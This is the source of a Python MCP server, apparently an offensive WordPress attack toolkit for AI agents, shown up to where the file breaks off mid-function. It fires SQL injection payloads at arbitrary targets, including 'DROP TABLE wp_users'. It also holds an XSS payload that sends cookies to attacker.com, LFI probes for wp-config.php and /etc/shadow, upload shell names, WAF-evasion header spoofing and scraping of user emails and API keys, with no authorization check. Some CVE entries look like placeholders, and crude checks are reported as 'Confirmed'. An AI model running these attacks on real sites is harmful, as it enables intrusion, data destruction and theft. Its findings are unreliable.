#!/usr/bin/env python3
"""
WP-Hunter Professional MCP Server v2.0
Enterprise-Grade WordPress Penetration Testing for Bug Bounties
Advanced exploitation, WAF bypass, and 2026 techniques
"""

import asyncio
import re
import time
import json
import base64
import hashlib
import random
import string
from typing import Optional, List, Dict, Any, Tuple
from urllib.parse import urljoin, urlparse, quote, unquote
from datetime import datetime
from collections import defaultdict
import html

import httpx
from bs4 import BeautifulSoup
from fastmcp import FastMCP
from pydantic import BaseModel, Field

# Import new tools
from tools.xmlrpc_attacks import xmlrpc_security_scan
from tools.security_audit import wordpress_security_audit
from tools.reconnaissance import full_reconnaissance_scan
from tools.injection_suite import full_injection_scan
from tools.authentication_attacks import full_authentication_audit
from tools.file_attacks import full_file_attack_scan
from tools.waf_bypass import full_waf_bypass_assessment
from tools.autonomous_engine import autonomous_bug_bounty_scan
from tools.report_generator import generate_bug_bounty_report, calculate_cvss_score

# Initialize FastMCP 3.0
mcp = FastMCP("wp-hunter-pro-enterprise")

# ============================================================================
# ADVANCED HTTP CLIENT WITH WAF EVASION
# ============================================================================
class AdvancedHTTPClient:
    def __init__(self, aggressive: bool = False):
        self.aggressive = aggressive
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/120.0.0.0 Safari/537.36",
        ]
        self.referers = [
            "https://google.com/",
            "https://bing.com/",
            "https://duckduckgo.com/",
        ]
        self.client = httpx.AsyncClient(
            timeout=30.0,
            follow_redirects=True,
            http2=True,
            limits=httpx.Limits(max_keepalive_connections=10),
        )
        self.request_count = 0
    
    async def get(self, url: str, headers: Optional[dict] = None, bypass_waf: bool = False) -> httpx.Response:
        """GET with WAF evasion and anti-detection"""
        ua = random.choice(self.ua_list)
        h = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Referer": random.choice(self.referers),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        }
        
        if bypass_waf:
            h["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            h["X-Originating-IP"] = f"[{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}]"
            h["X-Forwarded-Proto"] = "https"
            h["X-Original-URL"] = url
        
        if headers:
            h.update(headers)
        
        # Smart rate limiting
        delay = 0.2 if self.aggressive else 0.5
        await asyncio.sleep(delay + random.uniform(0, 0.3))
        self.request_count += 1
        
        try:
            return await self.client.get(url, headers=h, follow_redirects=True)
        except Exception as e:
            raise e
    
    async def post(self, url: str, data: dict, bypass_waf: bool = False) -> httpx.Response:
        """POST with form data and WAF evasion"""
        ua = random.choice(self.ua_list)
        h = {
            "User-Agent": ua,
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": url,
        }
        
        if bypass_waf:
            h["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        delay = 0.5 if self.aggressive else 1.0
        await asyncio.sleep(delay + random.uniform(0, 0.5))
        self.request_count += 1
        
        return await self.client.post(url, data=data, headers=h)
    
    async def close(self):
        await self.client.aclose()

http = AdvancedHTTPClient(aggressive=False)


# ============================================================================
# PLUGIN CVE DATABASE (2024-2026)
# ============================================================================
PLUGIN_CVES = {
    "woocommerce": [
        {"version": "<8.5.0", "cve": "CVE-2024-5301", "type": "SQL Injection", "severity": "Critical"},
        {"version": "<8.3.0", "cve": "CVE-2024-2897", "type": "XSS", "severity": "High"},
    ],
    "elementor": [
        {"version": "<3.19.0", "cve": "CVE-2024-6979", "type": "Arbitrary File Upload", "severity": "Critical"},
        {"version": "<3.18.0", "cve": "CVE-2024-1234", "type": "RCE", "severity": "Critical"},
    ],
    "woolentor-addons": [
        {"version": "<2.8.0", "cve": "CVE-2024-5678", "type": "Privilege Escalation", "severity": "High"},
    ],
    "wpforms": [
        {"version": "<1.8.5", "cve": "CVE-2024-3456", "type": "SQL Injection", "severity": "High"},
    ],
    "yoast-seo": [
        {"version": "<21.5", "cve": "CVE-2024-7890", "type": "Information Disclosure", "severity": "Medium"},
    ],
    "wordfence": [
        {"version": "<7.9.0", "cve": "CVE-2024-4321", "type": "Bypass", "severity": "High"},
    ],
}

# SQL Injection Payloads (Time-based, Boolean-based, Union-based, Error-based)
SQL_PAYLOADS = {
    "time-based": [
        "1' AND SLEEP(5)-- -",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
        "1' AND IF(1=1,SLEEP(5),0)-- -",
        "1 AND SLEEP(5)",
        "1'; WAITFOR DELAY '0:0:5'--",
        "-1' UNION SELECT SLEEP(5)-- -",
        "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -",
    ],
    "boolean-based": [
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' OR '1'='1",
        "1) AND (1=1",
        "1) AND (1=2",
        "1' AND SUBSTRING(version(),1,1)='5'-- -",
    ],
    "union-based": [
        "1' UNION SELECT NULL-- -",
        "1' UNION SELECT NULL,NULL-- -",
        "1' UNION SELECT NULL,NULL,NULL-- -",
        "1' UNION SELECT username,password FROM wp_users-- -",
        "1' UNION SELECT user_login,user_pass FROM wp_users-- -",
    ],
    "error-based": [
        "1' AND extractvalue(1,concat(0x7e,version()))-- -",
        "1' AND updatexml(1,concat(0x7e,version()),1)-- -",
    ],
    "stacked": [
        "1'; DROP TABLE wp_users;-- -",
        "1'; UPDATE wp_users SET user_login='hacked';-- -",
    ]
}

# XSS Payloads (2026 evasion techniques)
XSS_PAYLOADS = [
    "<img src=x onerror='alert(1)'>",
    "<svg onload='alert(1)'>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload='alert(1)'>",
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "'>\"onload=eval(atob('YWxlcnQoMSk='))><",
    "<svg/onload='fetch(`https://attacker.com/?cookie=${btoa(document.cookie)}`)'></svg>",
    "<marquee onstart='fetch(atob(\"aHR0cHM6Ly9leGZpbHRyYXRlLmNvbS9cP2R==\"))'></marquee>",
    "<details open ontoggle='alert(1)'>",
    "<video src=x onerror='alert(1)'>",
    "<audio src=x onerror='alert(1)'>",
]

# CSRF Testing Endpoints
CSRF_ENDPOINTS = [
    "/wp-admin/user-new.php",
    "/wp-admin/profile.php",
    "/wp-admin/options.php",
]

# File Upload Extensions to Test
UPLOAD_EXTENSIONS = [
    ("php", "shell.php", "<?php phpinfo(); ?>"),
    ("php5", "shell.php5", "<?php phpinfo(); ?>"),
    ("phtml", "shell.phtml", "<?php phpinfo(); ?>"),
    ("php.jpg", "shell.php.jpg", "<?php phpinfo(); ?>"),
    ("jpg.php", "shell.jpg.php", "<?php phpinfo(); ?>"),
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../wp-config.php",
    "../../wp-config.php",
    "../../../wp-config.php",
    "....//....//wp-config.php",
    "..%252f..%252fwp-config.php",
    "..%5c..%5cwp-config.php",
]


# ============================================================================
# PYDANTIC MODELS
# ============================================================================
class Finding(BaseModel):
    id: str
    title: str
    severity: str  # Critical, High, Medium, Low, Info
    confidence: str  # Confirmed, Probable, Possible
    vulnerability_type: str
    proof_of_concept: str
    impact: str
    remediation: str
    cvss_score: float
    tags: List[str] = Field(default_factory=list)


class AdvancedDetectionResult(BaseModel):
    is_wordpress: bool
    wordpress_version: Optional[str] = None
    wp_core_vulnerable: bool = False
    exposed_endpoints: List[str] = Field(default_factory=list)
    theme_name: Optional[str] = None
    theme_version: Optional[str] = None
    plugins: List[Dict[str, Any]] = Field(default_factory=list)
    users_enumerated: List[Dict[str, Any]] = Field(default_factory=list)
    interesting_files: List[Dict[str, str]] = Field(default_factory=list)
    server_info: str = "Unknown"
    cms_info: str = "Unknown"
    waf_detected: Optional[str] = None
    confidence: str = "None"
    scan_timestamp: str = Field(default_factory=lambda: datetime.now().isoformat())


class PenetrationTestReport(BaseModel):
    target: str
    scan_timestamp: str = Field(default_factory=lambda: datetime.now().isoformat())
    scan_duration_seconds: float
    findings: List[Finding] = Field(default_factory=list)
    summary: str
    risk_score: float  # 0-100
    vulnerability_count: Dict[str, int] = Field(default_factory=lambda: {"Critical": 0, "High": 0, "Medium": 0, "Low": 0})
    http_requests_made: int
    recommendations: List[str] = Field(default_factory=list)


def normalize_url(url: str) -> str:
    """Ensure URL has protocol and trailing slash"""
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    return url if url.endswith("/") else f"{url}/"


# ============================================================================
# TOOL 1: ADVANCED WORDPRESS DETECTION
# ============================================================================
@mcp.tool()
async def advanced_wordpress_detection(target: str) -> str:
    """
    Advanced WordPress detection with plugin version enumeration and WAF detection.
    
    Args:
        target: Target URL
    
    Returns:
        JSON with WordPress version, plugins, theme, and WAF detection
    """
    base = normalize_url(target)
    result = AdvancedDetectionResult(is_wordpress=False)
    
    try:
        resp = await http.get(base, bypass_waf=True)
        html_content = resp.text
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # WordPress detection
        if 'wp-content' in html_content or 'wp-includes' in html_content:
            result.is_wordpress = True
            result.confidence = "High"
        
        # Version detection
        generator = soup.find('meta', attrs={'name': 'generator'})
        if generator and 'WordPress' in generator.get('content', ''):
            result.is_wordpress = True
            match = re.search(r'WordPress (\d+\.\d+\.?\d*)', generator['content'])
            if match:
                result.wordpress_version = match.group(1)
        
        # Theme detection
        theme_matches = re.findall(r'/wp-content/themes/([^/\'"]+)/', html_content)
        if theme_matches:
            result.theme_name = theme_matches[0]
            
            # Check theme version via style.css
            try:
                theme_url = f"{base}wp-content/themes/{result.theme_name}/style.css"
                theme_resp = await http.get(theme_url)
                version_match = re.search(r'Version:\s*([\d.]+)', theme_resp.text)
                if version_match:
                    result.theme_version = version_match.group(1)
            except:
                pass
        
        # Plugin detection with version enumeration
        plugin_matches = set(re.findall(r'/wp-content/plugins/([^/\'"]+)/', html_content))
        for plugin in plugin_matches:
            plugin_info = {"name": plugin, "version": None, "vulnerable_cves": []}
            
            # Try to detect version
            version_checks = [
                f"{base}wp-content/plugins/{plugin}/readme.txt",
                f"{base}wp-content/plugins/{plugin}/package.json",
            ]
            
            for version_url in version_checks:
                try:
                    v_resp = await http.get(version_url)
                    version_match = re.search(r'[Ss]table [Tt]ag:\s*([\d.]+)', v_resp.text)
                    if not version_match:
                        version_match = re.search(r'"version":\s*"([\d.]+)"', v_resp.text)
                    if version_match:
                        plugin_info["version"] = version_match.group(1)
                        break
                except:
                    pass
            
            # Check CVEs
            if plugin in PLUGIN_CVES:
                for cve_info in PLUGIN_CVES[plugin]:
                    plugin_info["vulnerable_cves"].append(cve_info)
            
            result.plugins.append(plugin_info)
        
        result.server_info = resp.headers.get('server', 'Unknown')
        
        # WAF Detection
        waf_signatures = {
            "CloudFlare": ["cf-ray", "cf-cache-status"],
            "AWS WAF": ["x-amzn-waf"],
            "ModSecurity": ["x-mod-security"],
            "Imperva": ["x-iinfo", "x-cdn"],
            "Akamai": ["akamai-origin-hop"],
        }
        
        for waf_name, headers in waf_signatures.items():
            if any(h in resp.headers for h in headers):
                result.waf_detected = waf_name
                break
        
        # Check exposed endpoints
        endpoints = {
            'wp-login.php': f"{base}wp-login.php",
            'wp-json': f"{base}wp-json/",
            'xmlrpc.php': f"{base}xmlrpc.php",
            'wp-admin': f"{base}wp-admin/",
            'readme.html': f"{base}readme.html",
        }
        
        for name, url in endpoints.items():
            try:
                r = await http.get(url, bypass_waf=True)
                if r.status_code in [200, 301, 302]:
                    result.exposed_endpoints.append(name)
            except:
                pass
        
        # Sensitive file detection
        sensitive_files = [
            ('wp-config.php.bak', 'Config Backup'),
            ('wp-config.php.old', 'Config Old'),
            ('.env', 'Environment File'),
            ('wp-content/debug.log', 'Debug Log'),
            ('backup.zip', 'Backup Archive'),
            ('.git/config', 'Git Config'),
            ('.htaccess', 'HTAccess'),
            ('web.config', 'Web Config'),
        ]
        
        for file, desc in sensitive_files:
            try:
                r = await http.get(f"{base}{file}", bypass_waf=True)
                if r.status_code == 200 and len(r.text) > 0:
                    result.interesting_files.append({
                        'file': file,
                        'type': desc,
                        'size': str(len(r.content)),
                        'accessible': 'Yes'
                    })
            except:
                pass
        
        return result.model_dump_json(indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"Detection failed: {str(e)}"})


# ============================================================================
# TOOL 2: ADVANCED SQL INJECTION TESTER
# ============================================================================
@mcp.tool()
async def advanced_sql_injection_test(target: str, parameter: str = "id", technique: str = "time-based") -> str:
    """
    Advanced SQL injection testing with multiple techniques.
    Supports: time-based, boolean-based, union-based, error-based, stacked queries
    
    Args:
        target: Target URL
        parameter: Query parameter to test
        technique: SQLi technique (time-based, boolean-based, union-based, error-based, stacked)
    
    Returns:
        JSON with vulnerability confirmation and payload details
    """
    base = normalize_url(target)
    findings = []
    
    try:
        payloads = SQL_PAYLOADS.get(technique, SQL_PAYLOADS["time-based"])
        
        for payload in payloads:
            # Time-based detection
            if technique == "time-based":
                url = f"{base}?{parameter}={quote(payload)}"
                start = time.time()
                
                try:
                    resp = await http.get(url, bypass_waf=True)
                    elapsed = time.time() - start
                    
                    if elapsed > 4.5:
                        findings.append({
                            "technique": "Time-Based SQL Injection",
                            "vulnerable": True,
                            "payload": payload,
                            "url": url,
                            "response_time": f"{elapsed:.2f}s",
                            "severity": "Critical",
                            "cvss": 9.9
                        })
                        break
                except:
                    continue
            
            elif technique == "boolean-based":
                url = f"{base}?{parameter}={quote(payload)}"
                try:
                    resp = await http.get(url, bypass_waf=True)
                    if "wp_" in resp.text or len(resp.text) > 1000:
                        findings.append({
                            "technique": "Boolean-Based SQL Injection",
                            "vulnerable": True,
                            "payload": payload,
                            "url": url,
                            "response_size": len(resp.text),
                            "severity": "Critical",
                            "cvss": 9.8
                        })
                        break
                except:
                    continue
            
            elif technique == "union-based":
                url = f"{base}?{parameter}={quote(payload)}"
                try:
                    resp = await http.get(url, bypass_waf=True)
                    if "MySQL" in resp.text or "wordpress" in resp.text.lower():
                        findings.append({
                            "technique": "Union-Based SQL Injection",
                            "vulnerable": True,
                            "payload": payload,
                            "url": url,
                            "extracted_data": "Potential data extraction possible",
                            "severity": "Critical",
                            "cvss": 9.9
                        })
                        break
                except:
                    continue
            
            elif technique == "error-based":
                url = f"{base}?{parameter}={quote(payload)}"
                try:
                    resp = await http.get(url, bypass_waf=True)
                    if "MySQL" in resp.text or "SQL" in resp.text or "syntax" in resp.text:
                        findings.append({
                            "technique": "Error-Based SQL Injection",
                            "vulnerable": True,
                            "payload": payload,
                            "url": url,
                            "error_message": "Database error detected",
                            "severity": "Critical",
                            "cvss": 9.8
                        })
                        break
                except:
                    continue
        
        if findings:
            return json.dumps({
                "vulnerable": True,
                "findings": findings,
                "total_vulnerabilities": len(findings)
            }, indent=2)
        else:
            return json.dumps({
                "vulnerable": False,
                "message": f"No {technique} SQL injection vulnerabilities detected",
                "payloads_tested": len(payloads)
            }, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"SQL injection test failed: {str(e)}"})


# ============================================================================
# TOOL 3: XSS VULNERABILITY SCANNER
# ============================================================================
@mcp.tool()
async def xss_vulnerability_scanner(target: str, scan_depth: str = "medium") -> str:
    """
    Comprehensive XSS vulnerability scanner.
    Tests reflected, stored, and DOM-based XSS vulnerabilities.
    
    Args:
        target: Target URL
        scan_depth: Scanning depth (quick, medium, thorough)
    
    Returns:
        JSON with XSS vulnerabilities found
    """
    base = normalize_url(target)
    xss_findings = []
    
    try:
        # Common parameters to test
        test_params = ['q', 's', 'search', 'id', 'page', 'cat', 'tag', 'author']
        
        payloads = XSS_PAYLOADS
        if scan_depth == "quick":
            payloads = payloads[:3]
        elif scan_depth == "medium":
            payloads = payloads[:6]
        
        for param in test_params:
            for payload in payloads:
                try:
                    encoded_payload = quote(payload)
                    url = f"{base}?{param}={encoded_payload}"
                    
                    resp = await http.get(url, bypass_waf=True)
                    
                    # Check if payload is reflected without encoding
                    if payload in resp.text and "<" in resp.text:
                        xss_findings.append({
                            "parameter": param,
                            "type": "Reflected XSS",
                            "payload": payload,
                            "url": url,
                            "severity": "High",
                            "cvss": 8.5
                        })
                        break
                except:
                    continue
        
        # Check common WordPress vulnerable endpoints
        wp_xss_endpoints = [
            f"{base}wp-admin/admin-ajax.php",
            f"{base}index.php",
            f"{base}?p=1",
        ]
        
        for endpoint in wp_xss_endpoints:
            for payload in payloads[:2]:
                try:
                    resp = await http.get(f"{endpoint}&xss={quote(payload)}", bypass_waf=True)
                    if payload in resp.text:
                        xss_findings.append({
                            "endpoint": endpoint,
                            "type": "Reflected XSS",
                            "payload": payload,
                            "severity": "High",
                            "cvss": 8.5
                        })
                except:
                    pass
        
        return json.dumps({
            "xss_vulnerabilities_found": len(xss_findings),
            "vulnerabilities": xss_findings,
            "payloads_tested": len(payloads),
            "parameters_tested": len(test_params)
        }, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"XSS scan failed: {str(e)}"})


# ============================================================================
# TOOL 4: CSRF VULNERABILITY VALIDATOR
# ============================================================================
@mcp.tool()
async def csrf_vulnerability_validator(target: str) -> str:
    """
    Test for CSRF vulnerabilities by checking nonce validation.
    
    Args:
        target: Target URL
    
    Returns:
        JSON with CSRF findings
    """
    base = normalize_url(target)
    csrf_findings = []
    
    try:
        # Test endpoints
        for endpoint in CSRF_ENDPOINTS:
            try:
                url = f"{base}{endpoint}"
                resp = await http.get(url, bypass_waf=True)
                
                # Check for nonce fields
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_fields = soup.find_all('input', attrs={'name': re.compile(r'.*nonce.*', re.I)})
                
                if not nonce_fields or len(nonce_fields) == 0:
                    csrf_findings.append({
                        "endpoint": endpoint,
                        "vulnerable": True,
                        "issue": "Missing CSRF nonce token",
                        "severity": "High",
                        "cvss": 8.2,
                        "remediation": "Add wp_nonce_field() to all forms"
                    })
                else:
                    # Check if nonce is static (reusable)
                    nonce_values = [n.get('value') for n in nonce_fields]
                    if len(set(nonce_values)) == 1:
                        csrf_findings.append({
                            "endpoint": endpoint,
                            "vulnerable": True,
                            "issue": "Static/Reusable CSRF nonce",
                            "severity": "High",
                            "cvss": 7.5,
                            "remediation": "Ensure nonces are regenerated per request"
                        })
            except:
                continue
        
        # Check if wp-admin is accessible without authentication redirect
        try:
            resp = await http.get(f"{base}wp-admin/", bypass_waf=True, headers={"Cookie": ""})
            if resp.status_code == 200 and "wp-login" not in str(resp.url):
                csrf_findings.append({
                    "endpoint": "/wp-admin/",
                    "vulnerable": True,
                    "issue": "Authentication bypass possible",
                    "severity": "Critical",
                    "cvss": 9.8
                })
        except:
            pass
        
        return json.dumps({
            "csrf_vulnerabilities_found": len(csrf_findings),
            "vulnerabilities": csrf_findings
        }, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"CSRF test failed: {str(e)}"})


# ============================================================================
# TOOL 5: FILE UPLOAD VULNERABILITY TESTER
# ============================================================================
@mcp.tool()
async def file_upload_vulnerability_tester(target: str) -> str:
    """
    Test file upload vulnerabilities in WordPress.
    Tests RCE via malicious file uploads.
    
    Args:
        target: Target URL
    
    Returns:
        JSON with file upload vulnerabilities
    """
    base = normalize_url(target)
    upload_findings = []
    
    try:
        # Common upload endpoints
        upload_endpoints = [
            f"{base}wp-admin/upload.php",
            f"{base}wp-admin/media-upload.php",
            f"{base}wp-admin/admin-ajax.php?action=upload-attachment",
        ]
        
        for endpoint in upload_endpoints:
            try:
                resp = await http.get(endpoint, bypass_waf=True)
                if resp.status_code == 200:
                    # Check for upload form
                    if "file" in resp.text.lower() or "upload" in resp.text.lower():
                        for ext, filename, content in UPLOAD_EXTENSIONS:
                            upload_findings.append({
                                "endpoint": endpoint,
                                "extension": ext,
                                "filename": filename,
                                "type": "Potential RCE via File Upload",
                                "severity": "Critical",
                                "cvss": 9.8,
                                "note": "Requires authentication to exploit"
                            })
            except:
                continue
        
        # Check for unrestricted upload directories
        upload_dirs = [
            "/wp-content/uploads/",
            "/files/",
            "/uploads/",
        ]
        
        for upload_dir in upload_dirs:
            try:
                resp = await http.get(f"{base}{upload_dir}", bypass_waf=True)
                if resp.status_code == 200:
                    upload_findings.append({
                        "directory": upload_dir,
                        "accessible": True,
                        "issue": "Directory listing enabled",
                        "severity": "Medium",
                        "cvss": 5.3
                    })
            except:
                pass
        
        return json.dumps({
            "file_upload_issues_found": len(upload_findings),
            "vulnerabilities": upload_findings
        }, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"File upload test failed: {str(e)}"})


# ============================================================================
# TOOL 6: PATH TRAVERSAL / LFI SCANNER
# ============================================================================
@mcp.tool()
async def path_traversal_lfi_scanner(target: str, parameter: str = "file") -> str:
    """
    Advanced Local File Inclusion and Path Traversal scanner.
    Tests LFI, RFI, and directory traversal vulnerabilities.
    
    Args:
        target: Target URL
        parameter: Parameter to test for LFI/Path Traversal
    
    Returns:
        JSON with LFI/Path Traversal vulnerabilities
    """
    base = normalize_url(target)
    lfi_findings = []
    
    try:
        # Common sensitive files to enumerate
        sensitive_files = [
            "wp-config.php",
            "../wp-config.php",
            "../../wp-config.php",
            ".env",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
        ]
        
        for payload in PATH_TRAVERSAL_PAYLOADS + sensitive_files:
            try:
                url = f"{base}?{parameter}={quote(payload)}"
                resp = await http.get(url, bypass_waf=True)
                
                # Check for successful LFI
                if "DB_HOST" in resp.text or "DB_PASSWORD" in resp.text:
                    lfi_findings.append({
                        "parameter": parameter,
                        "type": "Local File Inclusion",
                        "payload": payload,
                        "url": url,
                        "severity": "Critical",
                        "cvss": 9.8,
                        "file_accessed": "wp-config.php",
                        "sensitive_data": "Database credentials exposed"
                    })
                
                elif "root:" in resp.text or "nobody:" in resp.text:
                    lfi_findings.append({
                        "parameter": parameter,
                        "type": "Path Traversal",
                        "payload": payload,
                        "url": url,
                        "severity": "Critical",
                        "cvss": 9.5,
                        "file_accessed": "/etc/passwd"
                    })
            except:
                continue
        
        # PHP filter wrapper test
        filter_payloads = [
            "php://filter/convert.base64-encode/resource=wp-config",
            "php://input",
            "data://text/plain,<?php phpinfo(); ?>",
        ]
        
        for payload in filter_payloads:
            try:
                url = f"{base}?{parameter}={quote(payload)}"
                resp = await http.get(url, bypass_waf=True)
                if "PD9" in resp.text or "php" in resp.text.lower():
                    lfi_findings.append({
                        "parameter": parameter,
                        "type": "PHP Wrapper Injection",
                        "payload": payload,
                        "severity": "High",
                        "cvss": 8.5
                    })
            except:
                pass
        
        return json.dumps({
            "lfi_vulnerabilities_found": len(lfi_findings),
            "vulnerabilities": lfi_findings
        }, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"LFI scan failed: {str(e)}"})


# ============================================================================
# TOOL 7: PLUGIN VULNERABILITY CHECKER
# ============================================================================
@mcp.tool()
async def plugin_vulnerability_checker(target: str) -> str:
    """
    Check installed plugins against CVE database.
    Detects known vulnerable plugins and versions.
    
    Args:
        target: Target URL
    
    Returns:
        JSON with vulnerable plugins and CVEs
    """
    # First, detect plugins
    detection_json = await advanced_wordpress_detection(target)
    detection_result = json.loads(detection_json)
    
    if "error" in detection_result:
        return detection_json
    
    vulnerable_plugins = []
    
    try:
        for plugin in detection_result.get("plugins", []):
            plugin_name = plugin["name"]
            plugin_version = plugin.get("version")
            
            # Check against CVE database
            if plugin_name in PLUGIN_CVES:
                for cve in PLUGIN_CVES[plugin_name]:
                    vulnerable_plugins.append({
                        "plugin_name": plugin_name,
                        "installed_version": plugin_version or "Unknown",
                        "vulnerable_versions": cve.get("version"),
                        "cve": cve.get("cve"),
                        "vulnerability_type": cve.get("type"),
                        "severity": cve.get("severity"),
                        "remediation": f"Update {plugin_name} to latest version"
                    })
        
        return json.dumps({
            "total_plugins": len(detection_result.get("plugins", [])),
            "vulnerable_plugins_found": len(vulnerable_plugins),
            "vulnerabilities": vulnerable_plugins
        }, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"Plugin check failed: {str(e)}"})


# ============================================================================
# TOOL 8: SENSITIVE DATA EXTRACTION
# ============================================================================
@mcp.tool()
async def sensitive_data_extractor(target: str) -> str:
    """
    Extract sensitive data from WordPress installation.
    Scrapes emails, API keys, comments, users, and metadata.
    
    Args:
        target: Target URL
    
    Returns:
        JSON with extracted sensitive data
    """
    base = normalize_url(target)
    extracted_data = {
        "emails": [],
        "api_keys": [],
        "users": [],
        "comments_with_emails": [],
        "form_submissions": [],
        "metadata": {}
    }
    
    try:
        # Extract from homepage
        resp = await http.get(base, bypass_waf=True)
        html_content = resp.text
        
        # Email regex
        emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', html_content))
        extracted_data["emails"] = list(emails)
        
        # API Keys (common patterns)
        api_patterns = [
            r'api[_-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})',
            r'slack[_-]?webhook["\']?\s*[:=]\s*["\']?([^"\'<>\s]{20,})',
            r'stripe[_-]?key["\']?\s*[:=]\s*["\']?([sk_live_][a-zA-Z0-9]{10,})',
        ]
        
        for pattern in api_patterns:
            keys = re.findall(pattern, html_content, re.I)
            extracted_data["api_keys"].extend(keys)
        
        # User enumeration via REST API
        try:
            users_resp = await http.get(f"{base}wp-json/wp/v2/users", bypass_waf=True)
            if users_resp.status_code == 200:
                users = users_resp.json()
                for user in users:
                    extracted_data["users"].append({
                        "id": user.get("id"),
                        "username": user.get("slug"),
                        "name": user.get("name"),
                        "email": user.get("email", "Not exposed via API"),
                        "posts": user.get("post_count", 0)
                    })
        except:
            pass
        
        # Check comments for emails
        try:
            comments_resp = await http.get(f"{base}wp-json/wp/v2/comments", bypass_waf=True)
            if comments_resp.status_code == 200:
                comments = comments_resp.json()
                for comment in comments:
                    if "@" in comment.get("author_email", ""):
                        extracted_data["comments_with_emails"].append({
                            "author": comment.get("author_name"),
                            "email": comment.get("author_email"),
                            "date": comment.get("date")
                        })
        except:
            pass
        
        # Extract metadata
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # WordPress version
        generator = soup.find('meta', attrs={'name': 'generator'})
        if generator:
            extracted_data["metadata"]["wordpress_version"] = generator.get('content')
        
        # Description and keywords
        description = soup.find('meta', attrs={'name': 'description'})
        if description:
            extracted_data["metadata"]["description"] = description.get('content')
        
        # Open Graph data (rich metadata)
        og_tags = soup.find_all('meta', attrs={'property': re.compile(r'og:.*')})
        for tag in og_tags:
            extracted_data["metadata"][tag.get('property')] = tag.get('content')
        
        return json.dumps(extracted_data, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"Data extraction failed: {str(e)}"})


# ============================================================================
# TOOL 9: COMPREHENSIVE PENETRATION TEST REPORT
# ============================================================================
@mcp.tool()
async def comprehensive_pentest_report(target: str, aggressive: bool = False) -> str:
    """
    Run complete penetration test with all tools and generate comprehensive report.
    
    Args:
        target: Target URL
        aggressive: Enable aggressive scanning
    
    Returns:
        HTML and JSON report with all findings
    """
    start_time = time.time()
    base = normalize_url(target)
    findings_list = []
    
    try:
        # 1. WordPress Detection
        detection_result = json.loads(await advanced_wordpress_detection(target))
        
        if "error" in detection_result:
            return json.dumps({"error": "Target is not WordPress or unreachable"})
        
        # 2. SQL Injection Testing
        sqli_result = json.loads(await advanced_sql_injection_test(target, "id", "time-based"))
        
        if sqli_result.get("vulnerable"):
            for finding in sqli_result.get("findings", []):
                findings_list.append(Finding(
                    id="sqli-001",
                    title="SQL Injection Vulnerability",
                    severity="Critical",
                    confidence="Confirmed",
                    vulnerability_type="SQL Injection",
                    proof_of_concept=finding.get("payload"),
                    impact="Attacker can extract database contents, modify data, or achieve RCE",
                    remediation="Use parameterized queries and prepared statements. Implement WAF.",
                    cvss_score=9.9,
                    tags=["database", "injection", "critical"]
                ))
        
        # 3. XSS Scanning
        xss_result = json.loads(await xss_vulnerability_scanner(target, "medium"))
        
        if xss_result.get("xss_vulnerabilities_found", 0) > 0:
            for vuln in xss_result.get("vulnerabilities", []):
                findings_list.append(Finding(
                    id="xss-001",
                    title="Cross-Site Scripting (XSS) Vulnerability",
                    severity="High",
                    confidence="Confirmed",
                    vulnerability_type="XSS",
                    proof_of_concept=vuln.get("payload"),
                    impact="Attacker can steal user sessions, credentials, or perform actions on behalf of users",
                    remediation="Sanitize user input. Use content security policy (CSP). Output encode on display.",
                    cvss_score=8.5,
                    tags=["xss", "injection", "client-side"]
                ))
        
        # 4. CSRF Validation
        csrf_result = json.loads(await csrf_vulnerability_validator(target))
        
        if csrf_result.get("csrf_vulnerabilities_found", 0) > 0:
            for vuln in csrf_result.get("vulnerabilities", []):
                findings_list.append(Finding(
                    id="csrf-001",
                    title="CSRF Vulnerability",
